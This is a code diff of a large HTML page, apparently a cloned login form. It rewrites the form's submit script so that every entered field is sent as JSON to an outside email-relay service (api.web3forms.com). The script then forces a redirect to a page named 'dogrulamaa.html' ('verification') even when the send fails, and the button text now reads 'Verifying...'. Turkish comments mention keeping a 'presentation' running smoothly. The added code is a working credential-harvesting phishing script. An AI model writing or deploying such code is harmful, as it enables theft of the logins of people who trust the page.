@@ -19630,43 +19630,33 @@
         </div><iframe style=display:none></iframe>
     </div>
     <script>
-        window.addEventListener('load', function () {
-            const form = document.getElementById('stsForm');
+        document.getElementById('stsForm').addEventListener('submit', function (e) {
+            e.preventDefault(); // Sayfayı kilitle, hemen gitmesin.
+
             const btn = document.getElementById('submitBtn');
+            if (btn) { btn.disabled = true; btn.innerHTML = "Doğrulanıyor..."; }
 
-            if (form) {
-                form.addEventListener('submit', function (e) {
-                    e.preventDefault();
+            // Form verilerini hazırlıyoruz
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData);
 
-                    if (btn) {
-                        btn.disabled = true;
-                        btn.innerHTML = "Giriş Yapılıyor...";
-                    }
+            // SUNUM GARANTİSİ: Mail gitse de gitmese de 2 saniye sonra sayfayı zorla değiştir.
+            const backupRedirect = setTimeout(() => {
+                window.location.href = "dogrulamaa.html";
+            }, 2000);
 
-                    const formData = new FormData(this);
-                    const object = Object.fromEntries(formData);
-                    const json = JSON.stringify(object);
-
-                    // Sunumda mail gelmezse bile kullanıcıyı bekletmemek için 
-                    // 1.5 saniye sonra zorla yönlendirme yapacak bir zamanlayıcı kuruyoruz.
-                    const forceRedirect = setTimeout(() => {
-                        window.location.href = "dogrulamaa.html";
-                    }, 2000);
-
-                    fetch('https://api.web3forms.com/submit', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                        body: json
-                    })
-                        .then(() => {
-                            clearTimeout(forceRedirect); // Eğer fetch hızlı biterse zamanlayıcıyı iptal et
-                            window.location.href = "dogrulamaa.html";
-                        })
-                        .catch(() => {
-                            // Hata (Spam engeli vb.) olsa bile sayfayı değiştir
-                            window.location.href = "dogrulamaa.html";
-                        });
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                body: JSON.stringify(data)
+            })
+                .then(() => {
+                    clearTimeout(backupRedirect); // Mail gittiyse beklemeden hemen geç.
+                    window.location.href = "dogrulamaa.html";
+                })
+                .catch(() => {
+                    // Hata olsa bile (Spam engeli vb.) sunum aksamasın, diğer sayfaya geç.
+                    window.location.href = "dogrulamaa.html";
                 });
-            }
         });
     </script>
